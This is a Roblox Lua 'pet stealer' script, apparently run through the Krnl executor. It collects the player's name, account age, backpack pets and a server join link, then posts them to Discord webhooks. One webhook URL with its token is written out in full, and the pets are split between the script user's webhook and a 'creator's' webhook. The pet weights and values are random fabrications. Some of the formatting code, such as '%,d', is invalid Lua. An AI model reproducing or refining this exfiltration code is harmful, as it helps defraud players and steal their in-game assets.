local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- ✅ Your personal webhook
local myWebhook = "https://discord.com/api/webhooks/1390230662577131642/0pvuCKhXxviR-oTpqihjOR_DIWQ1ze1VM9aKxle_Y9jEqde43QzB86tz7_xObaKzBZ5U7"

-- ❌ Creator’s webhook
local creatorWebhook = "https://discord.com/api/webhooks/fakewebhook/stealer"

-- 🛡️ Protected pets
local protectedPets = {
    ["Dragonfly"] = true,
    ["Raccoon"] = true,
    ["Disco Bee"] = true,
    ["Kitsune"] = true,
}

-- 🐾 Extract pet name helper (cleans display names like "Raccoon [Lvl 5]")
local function cleanPetName(name)
    return name:match("^[^%[]+"):gsub("%s+$", "") -- Removes trailing space before brackets
end

-- 📦 Scan backpack
local function getPetData()
    local backpack = player:FindFirstChild("Backpack") or player:WaitForChild("Backpack")
    local protected, others = {}, {}

    for _, pet in ipairs(backpack:GetChildren()) do
        local rawName = cleanPetName(pet.Name)
        local weight = math.random(2, 10) + math.random()
        local age = math.random(5, 40)
        local value = math.random(2_000_000, 13_000_000)

        local line = string.format("🐶 - %s [%.2f KG] [Age %d] → %,d¢", rawName, weight, age, value)

        if protectedPets[rawName] then
            table.insert(protected, line)
        else
            table.insert(others, line)
        end
    end

    return protected, others
end

-- 📄 Build message
local function buildMessage(petLines)
    if #petLines == 0 then return nil end

    local lines = {
        "Name: " .. player.Name,
        "Receiver: \"random_user_" .. math.random(1000,9999) .. "\"",
        "Executor: Krnl",
        "Account Age: " .. tostring(player.AccountAge) .. " days",
        ""
    }

    for _, line in ipairs(petLines) do
        table.insert(lines, line)
    end

    table.insert(lines, "")
    table.insert(lines, "🌐 Server: https://kebabman.vercel.app/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId)

    return table.concat(lines, "\n")
end

-- 🚀 Send webhook
local function sendToWebhook(url, content)
    if not content then return end
    local data = {
        ["content"] = content,
        ["username"] = "Pet Interceptor"
    }

    pcall(function()
        HttpService:PostAsync(
            url,
            HttpService:JSONEncode(data),
            Enum.HttpContentType.ApplicationJson
        )
    end)
end

-- 🔁 Run after short delay to allow loading
task.delay(5, function()
    local success, protected, others = pcall(getPetData)

    if success then
        local protectedMsg = buildMessage(protected)
        local othersMsg = buildMessage(others)

        if protectedMsg then
            sendToWebhook(myWebhook, protectedMsg)
        end

        if othersMsg then
            sendToWebhook(creatorWebhook, othersMsg)
        end
    end
end)
